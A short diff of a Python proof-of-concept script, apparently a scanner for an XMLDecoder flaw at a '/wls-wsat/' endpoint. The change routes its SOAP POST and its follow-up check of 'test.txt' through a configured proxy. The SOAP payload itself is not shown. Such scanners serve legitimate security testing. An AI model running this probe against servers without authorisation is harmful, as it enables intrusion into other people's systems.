@@ -3,8 +3,10 @@
 
 
 import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+from Config.config_proxies import proxies
+
+requests.packages.urllib3.disable_warnings()
 
 # 脚本信息
 ######################################################
@@ -35,9 +37,9 @@ def poc(target):
         <soapenv:Body/>
     </soapenv:Envelope>
     '''
-    r = requests.post(url,headers=headers,data=data,timeout=3)
+    r = requests.post(url,headers=headers,data=data,timeout=3,proxies=proxies)
     url1 = target + '/wls-wsat/test.txt'
-    r1 = requests.get(url1,headers=headers,timeout=3)
+    r1 = requests.get(url1,headers=headers,timeout=3,proxies=proxies)
     try:
         if 'xmldecoder_vul_test' in r1.text:
             result['target'] = target
